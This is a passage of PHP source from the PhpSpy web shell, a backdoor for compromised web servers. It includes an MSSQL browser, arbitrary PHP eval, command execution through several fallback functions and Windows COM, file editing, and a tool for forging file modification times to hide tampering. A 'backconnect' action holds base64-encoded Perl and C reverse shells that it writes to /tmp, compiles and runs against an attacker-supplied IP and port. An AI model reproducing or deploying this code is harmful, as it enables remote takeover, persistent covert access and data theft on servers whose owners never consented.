							p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
							p('<td>'.$row['name'].'</td>');
							p('<td>'.$row['type'].'['.$row['xtype'].']</td>');
							p('<td>'.$row['length'].'&nbsp;</td>');
							p('<td>'.($row['isnullable'] ? 'Yes' : 'No').'&nbsp;</td>');
							p('<td>'.($row['colstat'] ? 'PRIMARY' : '').'&nbsp;</td>');
							p('<td>'.$row['text'].'&nbsp;</td>');
							p('<td>'.($row['autoval'] ? 'Auto_increment' : '').'&nbsp;</td>');
							p('</tr>');
						}
						p('<tr class="head">');
						p('<td>Field</td>');
						p('<td>Type[xtype]</td>');
						p('<td>Length</td>');
						p('<td>Isnullable</td>');
						p('<td>Key</td>');
						p('<td>Default</td>');
						p('<td>Extra</td>');
						p('</tr>');
						tbfoot();
					} elseif ($doing == 'insert' || $doing == 'edit') {					
						$result = msq("select b.name,c.name as type,c.xtype,b.length,b.isnullable,b.colstat,case when b.autoval is null then 0 else 1 end,b.colid,a.id,d.text from sysobjects a join syscolumns b on a.id = b.id join systypes c on b.xtype = c.xtype and c.usertype <> 18 left join syscomments d on d.id = b.cdefault where a.id = OBJECT_ID('[$tablename]') order by b.colid");
						$rowdb = array();
						while($tb = @mssql_fetch_assoc($result)) {
							$rowdb[$tb['name']] = $tb;
							$rowdb[$tb['name']]['Key'] = $tb['colstat'];
							$rowdb[$tb['name']]['Auto'] = $tb['autoval'];
						}
						$rs = array();
						if ($doing == 'insert') {
							p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
						} else {
							p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
							$where = base64_decode($base64);

							$result = msq("SELECT top 1 * FROM [$tablename] WHERE $where");
							$rs = mssql_fetch_array($result);
						}
						p('<form method="post" action="'.$self.'">');
						p($dbform);
						makehide('action','mssqladmin');
						makehide('tablename',$tablename);
						p('<table border="0" cellpadding="3" cellspacing="0">');

						foreach ($rowdb as $row) {
							if ($rs[$row['name']]) {
								$value = htmlspecialchars($rs[$row['name']]);
							} else {
								$value = '';
							}
							$thisbg = bg();
							p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
							if ($row['Key'] || $row['Auto']) {
								p('<td><b>'.$row['name'].'</b><br />'.$row['type'].'('.$row['length'].')'.($row['colstat'] ? '<br /><b>PRIMARY</b>' : '').($row['autoval'] ? ' <br /><b>Auto</b>' : '').'</td><td>'.$value.'&nbsp;</td></tr>');
							} else {							
								p('<td><b>'.$row['name'].'</b><br />'.$row['type'].'('.$row['length'].')'.($row['colstat'] ? '<br /><b>PRIMARY</b>' : '').($row['autoval'] ? ' <br /><b>Auto</b>' : '').'</td><td><textarea class="area" name="insertsql['.$row['name'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
							}
						}
						if ($doing == 'insert') {
							p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
						} else {
							p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
							makehide('base64', $base64);
						}
						p('</table></form>');
					} else {
						$querys = @explode(';',$sql_query);
						foreach($querys as $num=>$query) {
							if ($query) {
								p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
								switch(msqy($query))
								{
									case 0:
										p('<h2>Error : '.msmsg().'</h2>');
										break;	
									case 1:
										if (strtolower(substr($query,0,13)) == 'select * from') {
											$allowedit = 1;
										}
										if ($getnumsql) {
											$tatol = mssql_fetch_array(msq($getnumsql));
											$tatol = $tatol[0];
											$multipage = multi($tatol, $pagenum, $page, $tablename);
										}
										if (!$tablename) {
											$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
											$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
											preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
											$tablename = $matches[1][0];
										}
										p($multipage);

										$result = msq("select b.name,c.name as type,c.xtype,b.length,b.isnullable,b.colstat,case when b.autoval is null then 0 else 1 end,b.colid,a.id,d.text from sysobjects a join syscolumns b on a.id = b.id join systypes c on b.xtype = c.xtype and c.usertype <> 18 left join syscomments d on d.id = b.cdefault where a.id = OBJECT_ID('[$tablename]') order by b.colid");
										$rowdb = $tbdb = array();
										$keyfied = ''; //........
										while($tb = @mssql_fetch_array($result)) {
											$tbdb[] = $tb;
											$rowdb[$tb['name']]['Key'] = $tb['colstat'];
											$rowdb[$tb['name']]['Auto'] = $tb['autoval'];
											if ($tb['colstat']) {
												$keyfied = $tb['name'];
											}
										}
										p('<table border="0" cellpadding="3" cellspacing="0">');
										p('<tr class="head">');
										if ($allowedit) p('<td>Action</td>');
										foreach($tbdb as $tb){
											p('<td nowrap>'.$tb['name'].'<br><span>'.$tb['type'].'('.$tb['length'].') '.($tb['colstat'] ? '<b> - PRIMARY</b>' : '').($tb['autoval'] ? '<b> - Auto</b>' : '').'</span></td>');
										}
										p('</tr>');
										
										//..........................
										if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
											$query .= " order by $keyfied DESC";
										}

										$result = msq($query);
										$index=0;
										!$start_limit && $start_limit == 1;
										if($pagenum>0) @mssql_data_seek($result,$start_limit);
										while($mn = @mssql_fetch_assoc($result)){
											//...... DB-Library (.. ISQL).. ODBC 3.7 ............ ntext ............ Unicode .......... Unicode ..................
											//..................PHP..................nvalchar..nvarchar......
											if($index>$pagenum-1) break;

											$thisbg = bg();
											p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
											$where = $tmp = $b1 = '';
											//..............
											foreach($mn as $key=>$inside){
												if ($inside) {
													//..........................................................................
													if ($rowdb[$key]['Key'] == 1 || $rowdb[$key]['Auto'] == 1) {
														$where = $key."='".addslashes($inside)."'";
														break;
													}
													$where .= $tmp.$key."='".addslashes($inside)."'";
													$tmp = ' AND ';
												}
											}
											//..........
											foreach($mn as $key=>$inside){
												$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
											}
											$where = base64_encode($where);

											if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');

											p($b1);
											p('</tr>');
											$index++;
											unset($b1);
										}
										p('<tr class="head">');
										if ($allowedit) p('<td>Action</td>');
										foreach($tbdb as $tb){
											p('<td nowrap>'.$tb['name'].'<br><span>'.$tb['type'].'('.$tb['length'].') '.($tb['colstat'] ? '<b> - PRIMARY</b>' : '').($tb['autoval'] ? '<b> - Auto</b>' : '').'</span></td>');
										}
										p('</tr>');
										tbfoot();
										p($multipage);
										break;	
									case 2:
										$ar = mssql_affected_rows();
										p('<h2>affected rows : <b>'.$ar.'</b></h2>');
										break;
								}
							}
						}
					}
				} else {
					$query = msq("select sysobjects.id,sysobjects.name,sysobjects.category,sysusers.name as owner,sysobjects.crdate from sysobjects join sysusers on sysobjects.uid = sysusers.uid where sysobjects.xtype = 'U' order by sysobjects.name asc");
					$table_num = 0;
					$tabledb = array();
					while($table = mssql_fetch_array($query)) {
						$table_num++;
						$tabledb[] = $table;
					}
					unset($table);

					p('<table border="0" cellpadding="0" cellspacing="0">');
					p('<form action="'.$self.'" method="POST">');
					makehide('action','mssqladmin');
					p($dbform);
					p('<tr class="head">');
					p('<td>Name</td>');
					p('<td>Owner</td>');
					p('<td>Create_time</td>');
					p('<td>Operate</td>');
					p('</tr>');
					foreach ($tabledb as $key => $table) {
						$thisbg = bg();
						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
						p('<td><a href="javascript:settable(\''.$dbname.'.'.$table['owner'].'.'.$table['name'].'\');">'.$table['name'].'</a></td>');
						p('<td>'.$table['owner'].'</td>');
						p('<td>'.$table['crdate'].'</td>');
						p('<td><a href="javascript:settable(\''.$dbname.'.'.$table['owner'].'.'.$table['name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$dbname.'.'.$table['owner'].'.'.$table['name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$dbname.'.'.$table['owner'].'.'.$table['name'].'\', \'drop\');">Drop</a></td>');
						p('</tr>');
					}
					p('<tr class="head">');
					p('<td>Name</td>');
					p('<td>Owner</td>');
					p('<td>Create_time</td>');
					p('<td>Operate</td>');
					p('</tr>');
					p('<tr class='.bg().'>');
					p('<td colspan="4">Total tables: '.$table_num.'</td>');
					p('</tr>');
					p("</table>");
					msfr($query);
				}
			}
		}
	}
	tbfoot();
	if ($alreadymssql) {
		@mssql_close();
	}
}//end sql backup


elseif ($action == 'backconnect') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');

	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
		"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
		"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
		"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
		"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
		"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

	if ($start && $yourip && $yourport && $use){
		if ($use == 'perl') {
			cf('/tmp/angel_bc',$back_connect);
			$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
		} else {
			cf('/tmp/angel_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/angel_bc.c');
			$res = execute("/tmp/angel_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}

	formhead(array('title'=>'Back Connect'));
	makehide('action','backconnect');
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
	p('Your Port:');
	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
	p('Use:');
	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
}//end sql backup

elseif ($action == 'eval') {
	$phpcode = trim($phpcode);
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?".">$phpcode<?");
	}
	formhead(array('title'=>'Eval PHP Code'));
	makehide('action','eval');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
	formfooter();
}//end eval

elseif ($action == 'editfile') {
	if(file_exists($opfile)) {
		$fp=@fopen($opfile,'r');
		$contents=@fread($fp, filesize($opfile));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
	formfooter();
	
	goback();

}//end editfile

elseif ($action == 'newtime') {
	$opfilemtime = @filemtime($opfile);
	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	formhead(array('title'=>'Clone file was last modified time'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
	formfooter();
	formhead(array('title'=>'Set last modified'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
	p('<p>Instead &raquo;');
	p('year:');
	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
	p('month:');
	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
	p('day:');
	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
	p('hour:');
	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
	p('minute:');
	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
	p('second:');
	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
	p('</p>');
	formfooter();
	goback();
}//end newtime

elseif ($action == 'shell') {
	if (IS_WIN && IS_COM) {
		if($program && $parameter) {
			$shell= new COM('Shell.Application');
			$a = $shell->ShellExecute($program,$parameter);
			m('Program run has '.(!$a ? 'success' : 'fail'));
		}
		!$program && $program = 'c:\windows\system32\cmd.exe';
		!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
		formhead(array('title'=>'Execute Program'));
		makehide('action','shell');
		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
		p('<p>');
		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
		p('</p>');
		formfoot();
	}
	formhead(array('title'=>'Execute Command'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
	}
	p('<p>');
	makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();

	if ($command) {
		p('<hr width="100%" noshade /><pre>');
		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
			$wsh = new COM('WScript.shell');
			$exec = $wsh->exec('cmd.exe /c '.$command);
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
			$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
			if (is_resource($process)) {
				fwrite($pipes[0], $command."\r\n");
				fwrite($pipes[0], "exit\r\n");
				fclose($pipes[0]);
				while (!feof($pipes[1])) {
					echo fgets($pipes[1], 1024);
				}
				fclose($pipes[1]);
				while (!feof($pipes[2])) {
					echo fgets($pipes[2], 1024);
				}
				fclose($pipes[2]);
				proc_close($process);
			}
		} else {
			echo(execute($command));
		}
		p('</pre>');
	}
}//end shell

elseif ($action == 'phpenv') {
	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
	!$dis_func && $dis_func = 'No';	
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',__FILE__),

		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',$adminmail),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('memory_limit',getcfg('memory_limit')),
		20 => array('post_max_size',getcfg('post_max_size')),
		21 => array('upload_max_filesize',$upsize),
		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		23 => array('disable_functions',$dis_func),
	);

	if($phpvarname) {
		m($phpvarname .' : '.getcfg($phpvarname));
	}

	formhead(array('title'=>'Server environment'));
	makehide('action','phpenv');
	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();

	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if ($a==0) {
			for($i=1;$i<=9;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif ($a == 1) {
			for($i=10;$i<=23;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}//end phpenv

else {
	m('Undefined Action');
}

?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
	Copyright (C) 2004-2009 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
</div>
</body>
</html>

<?php

/*======================================================
......
======================================================*/

function m($msg) {
	echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
	echo $msg;
	echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $admin, $timestamp, $_SERVER;
	$key = ($prefix ? $admin['cookiepre'] : '').$key;
	$life = $life ? $life : $admin['cookielife'];
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}	
function multi($num, $perpage, $curpage, $tablename) {
	$multipage = '';
	if($num > $perpage) {
		$page = 10;
		$offset = 5;
		$pages = @ceil($num / $perpage);
		if($page > $pages) {
			$from = 1;
			$to = $pages;
		} else {
			$from = $curpage - $offset;
			$to = $curpage + $page - $offset - 1;
			if($from < 1) {
				$to = $curpage + 1 - $from;
				$from = 1;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$to = $page;
				}
			} elseif($to > $pages) {
				$from = $curpage - $pages + $to;
				$to = $pages;
				if(($to - $from) < $page && ($to - $from) < $pages) {
					$from = $pages - $page + 1;
				}
			}
		}
		$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
		for($i = $from; $i <= $to; $i++) {
			$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
		}
		$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
		$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
	}
	return $multipage;
}
// ........
function loginpage() {
?>
	<style type="text/css">
	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
	</style>
	<form method="POST" action="">
	<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Login">
	</form>
<?php
	exit;
}//end loginpage()

function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr); 
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}
function dirsize($dir) { 
	$dh = @opendir($dir);
	$size = 0;
	while($file = @readdir($dh)) {
		if ($file != '.' && $file != '..') {
			$path = $dir.'/'.$file;
			if (@is_dir($path)) {
				$size += dirsize($path);
			} else {
				$size += @filesize($path);
			}
		}
	}
	@closedir($dh);
	return $size;
}
// ............
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

//....MYSQL......
function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
	global $charsetdb;
	@ini_set('mysql.connect_timeout', 5);
	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
		p('<h2>Can not connect to MySQL server</h2>');
		exit;
	}
	if($link && $dbname) {
		if (!@mysql_select_db($dbname, $link)) {
			p('<h2>Database selected has error</h2>');
			exit;
		}
	}
	if($link && mysql_get_server_info() > '4.1') {
		if($charset && in_array(strtolower($charset), $charsetdb)) {
			q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
		}
	}
	return $link;
}

//....MSSQL......
function msdbconn($dbhost,$dbuser,$dbpass,$dbname='') {
	global $alreadymssql;
	@ini_set('mssql.charset', 'UTF-8');
	@ini_set('mssql.textlimit', 2147483647);
	@ini_set('mssql.textsize', 2147483647);
	$alreadymssql = 1;
	if (!extension_loaded('mssql')) {
		p('<h2>mssql extension is disable.</h2>');
		$alreadymssql = 0;
		exit;
	}
	if(!$link = @mssql_connect($dbhost, $dbuser, $dbpass, false)) {
		p('<h2>'.msmsg().'</h2>');
		$alreadymssql = 0;
		exit;
	}
	if($link && $dbname) {
		if (!@mssql_select_db('['.$dbname.']', $link)) {
			p('<h2>'.msmsg().'</h2>');
			$alreadymssql = 0;
			exit;
		}
	}
	return $link;
}

// ............
function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

// ....HTML....
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "<br />", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// ........
function getChmod($filepath){
	return substr(base_convert(@fileperms($filepath),10,8),-4);
}

function getPerms($filepath) {
	$mode = @fileperms($filepath);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
 
	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($filepath)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($filepath));
		if ($array && is_array($array)) {
			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return '';
}

// ........
function deltree($deldir) {
	$mydir=@dir($deldir);	
	while($file=$mydir->read())	{ 		
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file); 
		}
		if (is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	} 
	$mydir->close(); 
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}

// ....................
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// ......................
function getPath($scriptpath, $nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}

// ......................
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// ....PHP........
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// ............
function getfun($funName) {
	return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

// ..............
function getextension($filename) {
	$pathinfo = pathinfo($filename);
